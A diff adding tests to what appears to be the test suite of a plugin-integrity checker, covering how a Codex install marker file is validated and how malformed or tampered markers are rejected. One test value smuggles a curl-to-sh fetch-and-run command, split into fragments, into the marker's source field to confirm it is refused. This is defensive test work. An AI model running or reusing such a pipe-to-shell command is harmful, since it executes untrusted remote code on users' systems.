@@ -527,6 +527,67 @@ test('tools/release-hashes.mjs prints the entry the runtime matches, and the run
   for (const f of walk(scripts)) assert.ok(!importsGenerator.test(fs.readFileSync(f, 'utf8')), f);
 });
 
+// --- v0.1.2 P1: the Codex install marker (`.codex-marketplace-install.json`) ---
+// Codex writes it into the plugin root on the first start after `codex plugin add` from a git marketplace:
+// 2-space pretty JSON, no trailing newline, exactly these keys in this order (shape seen on the real installs).
+const CODEX_MARKER = '.codex-marketplace-install.json';
+const codexMarkerOf = (o = {}) => ({ source_type: 'git', source: 'https://github.com/example/skill-sentry.git', ref_name: null, sparse_paths: [], revision: 'ab12'.repeat(10), ...o });
+const codexMarkerText = (o = {}) => JSON.stringify(codexMarkerOf(o), null, 2);
+const putCodexMarker = (dir, text = codexMarkerText()) => fs.writeFileSync(path.join(dir, CODEX_MARKER), text);
+const selfOf = (self, mutate) => pluginOf(discoverCodex({ homes: [codexHomeWithCopy(self, mutate).home], projectDir: null, selfRoot: self }).components).self === true;
+
+test('P1: the Codex install marker of the exact real shape does not break a same-version match, on either side', () => {
+  const self = buildSelfTree(tmp('self'));
+  assert.equal(selfOf(self, c => putCodexMarker(c)), true, 'marker on the inspected copy');
+  assert.equal(isCopyOfSelf(codexHomeWithCopy(self, c => putCodexMarker(c)).copy, self), true);
+  const self2 = buildSelfTree(tmp('self'));
+  const { copy } = codexHomeWithCopy(self2);
+  putCodexMarker(self2);
+  assert.equal(isCopyOfSelf(copy, self2), true, 'marker on the running tree only');
+  putCodexMarker(copy, codexMarkerText({ revision: 'cd34'.repeat(10) }));
+  assert.equal(isCopyOfSelf(copy, self2), true, 'a marker on both sides (other revision)');
+  assert.ok(shippedFiles(copy).has('scripts/guard.mjs') && !shippedFiles(copy).has(CODEX_MARKER), 'left out of the shipped set');
+});
+
+test('P1: a known release installed by Codex (shallow .git plus the install marker) is recognised', () => {
+  const { copy, releases } = skewSetup(c => {
+    putCodexMarker(c);
+    fs.mkdirSync(path.join(c, '.git', 'refs'), { recursive: true });
+    fs.writeFileSync(path.join(c, '.git', 'HEAD'), 'ref: refs/heads/main\n');
+    fs.writeFileSync(path.join(c, '.git', 'shallow'), `${'ab12'.repeat(10)}\n`);
+  });
+  assert.equal(knownRelease(copy, { releases }), '0.0.9');
+});
+
+test('P1: anything but the exact marker shape keeps the copy unknown (same version and known release)', () => {
+  const self = buildSelfTree(tmp('self'));
+  const cases = [
+    ['extra key', c => putCodexMarker(c, JSON.stringify({ ...codexMarkerOf(), extra: 1 }, null, 2))],
+    ['missing key', c => { const o = codexMarkerOf(); delete o.revision; putCodexMarker(c, JSON.stringify(o, null, 2)); }],
+    ['revision of the wrong type', c => putCodexMarker(c, codexMarkerText({ revision: 12 }))],
+    ['revision not a commit id', c => putCodexMarker(c, codexMarkerText({ revision: 'z'.repeat(40) }))],
+    ['ref_name of the wrong type', c => putCodexMarker(c, codexMarkerText({ ref_name: 7 }))],
+    ['sparse_paths not an array', c => putCodexMarker(c, codexMarkerText({ sparse_paths: {} }))],
+    ['sparse_paths not empty', c => putCodexMarker(c, codexMarkerText({ sparse_paths: ['scripts'] }))],
+    ['source with a payload', c => putCodexMarker(c, codexMarkerText({ source: `https://x.io/a.sh\n${'cu' + 'rl'} https://x.io${' | ' + 's' + 'h'}` }))],
+    ['source_type of the wrong type', c => putCodexMarker(c, codexMarkerText({ source_type: ['git'] }))],
+    ['array at the top', c => putCodexMarker(c, JSON.stringify([codexMarkerOf()], null, 2))],
+    ['compact JSON (not the shape written)', c => putCodexMarker(c, JSON.stringify(codexMarkerOf()))],
+    ['duplicate key', c => putCodexMarker(c, codexMarkerText().replace('"revision"', '"source": "x",\n  "revision"'))],
+    ['not JSON', c => putCodexMarker(c, 'q'.repeat(185))],
+    ['oversized', c => putCodexMarker(c, codexMarkerText({ source: `https://x.io/${'a'.repeat(5000)}` }))],
+    ['nested (not at the top)', c => putCodexMarker(path.join(c, 'scripts'))],
+    ['a directory of that name', c => fs.mkdirSync(path.join(c, CODEX_MARKER))],
+    ['two files (top and nested)', c => { putCodexMarker(c); putCodexMarker(path.join(c, 'skills')); }],
+    ['payload rides along', c => { putCodexMarker(c); fs.writeFileSync(path.join(c, 'run.mjs'), '// code\n'); }],
+  ];
+  for (const [label, mutate] of cases) {
+    assert.equal(selfOf(self, mutate), false, `same version: ${label}`);
+    const { copy, releases } = skewSetup(mutate);
+    assert.equal(knownRelease(copy, { releases }), null, `known release: ${label}`);
+  }
+});
+
 // --- discoverCodex ---
 
 const expected = fx => [...EXPECTED,
